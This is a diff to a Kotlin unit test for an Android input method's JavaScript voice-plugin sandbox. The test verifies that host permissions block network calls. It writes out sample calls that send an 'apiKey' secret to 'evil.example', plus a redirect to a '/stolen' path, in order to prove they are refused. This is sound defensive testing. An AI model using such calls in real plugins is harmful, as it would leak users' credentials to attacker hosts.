@@ -3,9 +3,10 @@ package org.fcitx.fcitx5.android.input.voice.js
 
 import com.dokar.quickjs.QuickJs
 import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.channels.Channel
 import kotlinx.coroutines.runBlocking
 import kotlinx.serialization.json.JsonPrimitive
+import kotlinx.serialization.json.jsonPrimitive
+import kotlinx.serialization.json.contentOrNull
 import okhttp3.OkHttpClient
 import okhttp3.Protocol
 import okhttp3.Response
@@ -26,6 +27,14 @@ class JsVoiceHostPermissionsTest {
     private val id = "js:permission-test"
     private val hosts = setOf("asr.example.com")
     private val policy get() = JsVoiceNetworkPolicy(id, hosts)
+
+    // Network bindings return Promises. Exercise them through the same await/pump path as a plugin.
+    private suspend fun invokeNative(js: QuickJs, code: String): String? {
+        js.evaluate<Any?>("foxy.plugin.register({start: async function() { return ($code); }});")
+        val result = JsVoiceInvoker.call({ js.evaluate<String>(it) }, "start", "{}", 5000)
+        result.error?.let { error(it) }
+        return result.result?.jsonPrimitive?.contentOrNull
+    }
 
     @Before fun before() { JsVoiceHostPermissions.revoke(id); JsVoiceHostPermissions.revoke("js:other") }
     @After fun after() { before() }
@@ -61,12 +70,13 @@ class JsVoiceHostPermissionsTest {
             Response.Builder().request(chain.request()).protocol(Protocol.HTTP_1_1).code(200).message("OK")
                 .body("ok".toResponseBody()).build()
         }.build()
-        val net = JsVoiceNet(client, policy, Channel(Channel.UNLIMITED)) { secrets++; "sensitive-test-value" }
+        val net = JsVoiceNet(client, policy, {}) { secrets++; "sensitive-test-value" }
         val js = QuickJs.create(Dispatchers.IO)
         try {
             net.install(js, "en")
+            js.evaluate<Any?>(JsVoicePrelude.SOURCE)
             suspend fun attempt(code: String) {
-                assertNotNull(code, runCatching { js.evaluate<Any?>(code) }.exceptionOrNull())
+                assertNotNull(code, runCatching { invokeNative(js, code) }.exceptionOrNull())
                 assertEquals(0, requests)
                 assertEquals(0, secrets)
             }
@@ -76,12 +86,12 @@ class JsVoiceHostPermissionsTest {
             JsVoiceHostPermissions.approve(id, hosts)
             attempt("__n_httpPost('https://evil.example/x', 'apiKey', '{}', '{}')")
             attempt("__n_wsConnect('wss://evil.example/x', 'apiKey', '', '', '{}')")
-            assertEquals("ok", js.evaluate<String>("__n_httpPost('https://asr.example.com/x', 'apiKey', '{}', '{}')"))
+            assertEquals("ok", invokeNative(js, "__n_httpPost('https://asr.example.com/x', 'apiKey', '{}', '{}')"))
             assertEquals(1, requests)
             assertEquals(1, secrets)
             JsVoiceHostPermissions.revoke(id)
             assertNotNull(runCatching {
-                js.evaluate<Any?>("__n_httpPost('https://asr.example.com/x', 'apiKey', '{}', '{}')")
+                invokeNative(js, "__n_httpPost('https://asr.example.com/x', 'apiKey', '{}', '{}')")
             }.exceptionOrNull())
             assertEquals(1, requests)
             assertEquals(1, secrets)
@@ -99,15 +109,16 @@ class JsVoiceHostPermissionsTest {
         val client = OkHttpClient.Builder().proxy(java.net.Proxy.NO_PROXY)
             .sslSocketFactory(trust.sslSocketFactory(), trust.trustManager).build()
         JsVoiceHostPermissions.approve(id, setOf("localhost"))
-        val net = JsVoiceNet(client, JsVoiceNetworkPolicy(id, setOf("localhost")), Channel(Channel.UNLIMITED)) { "test-key" }
+        val net = JsVoiceNet(client, JsVoiceNetworkPolicy(id, setOf("localhost")), {}) { "test-key" }
         val js = QuickJs.create(Dispatchers.IO)
         try {
             // A 307 would preserve the signed POST body and non-standard auth headers.
             server.enqueue(okhttp3.mockwebserver.MockResponse().setResponseCode(307)
                 .setHeader("Location", "https://127.0.0.1:${server.port}/stolen"))
             net.install(js, "en")
+            js.evaluate<Any?>(JsVoicePrelude.SOURCE)
             val url = JsonPrimitive(server.url("/voice").toString())
-            val error = runCatching { js.evaluate<Any?>("__n_httpPost($url, 'apiKey', '{}', '{}')") }.exceptionOrNull()
+            val error = runCatching { invokeNative(js, "__n_httpPost($url, 'apiKey', '{}', '{}')") }.exceptionOrNull()
             assertTrue(error?.message.orEmpty().contains("HTTP 307"))
             assertEquals(1, server.requestCount)
             assertEquals("Bearer test-key", server.takeRequest().getHeader("Authorization"))
